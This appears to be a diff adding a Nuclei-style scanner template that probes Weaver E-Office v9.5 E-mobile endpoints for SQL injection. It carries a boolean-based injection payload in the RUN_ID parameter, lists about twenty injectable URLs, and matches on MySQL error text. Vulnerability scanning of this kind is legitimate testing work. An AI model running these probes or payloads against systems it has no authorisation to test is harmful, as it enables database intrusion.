@@ -1,0 +1,48 @@
+id: weaver-eoffice-mutli-sqli
+info:
+  name: 泛微 EOffice-v9.5 mutli param - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/selinuxG/Golin/blob/7ae8938ca2fa876a2b113a63f02f62e9c32ecb3d/poc/yaml-poc/poc-yaml-EOffice-sql.yaml#L5
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 因为 waf 某些站点如果无法注入可直接不管
+    repair:
+    version:
+  tags: weaver,oa,sqli,eoffice
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/E-mobile/flowdo_page.php?diff=delete&RUN_ID=(SELECT%20(CASE%20WHEN%20(2080=2080)%20THEN%201%20ELSE%20(SELECT%204346%20UNION%20SELECT%201731)%20END))*"
+      - "{{BaseURL}}/E-mobile/flowdo_page.php?diff=delete&flowid=1"
+      - "{{BaseURL}}/E-mobile/flowimage_page.php?FLOW_ID=2"
+      - "{{BaseURL}}/E-mobile/diaryother_page.php?searchword=23"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=word&sortid=1"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=word&idstr=1"
+      - "{{BaseURL}}/E-mobile/flow/freeflowimg.php?RUN_ID="
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=addr&sortid=1"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=addr&userdept=1"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=addr&userpriv=1"
+      - "{{BaseURL}}/E-mobile/create/ajax_do.php?diff=wordsearch&idstr=1"
+      - "{{BaseURL}}/E-mobile/flow/flowhave_page.php?detailid=2,3"
+      - "{{BaseURL}}/E-mobile/flow/flowtype_free.php?flowid=1"
+      - "{{BaseURL}}/E-mobile/flow/flowtype_free.php?runid=1"
+      - "{{BaseURL}}/E-mobile/flow/flowtype_other.php?flowid=1"
+      - "{{BaseURL}}/E-mobile/flow/flowtype_other.php?runid=1"
+      - "{{BaseURL}}/E-mobile/flow/freeflowimage_page.php?fromid=2"
+      - "{{BaseURL}}/E-mobile/flow/freeflowimage_page.php?diff=new&runid=2"
+    
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'mysql_fetch_array')
+        condition: and
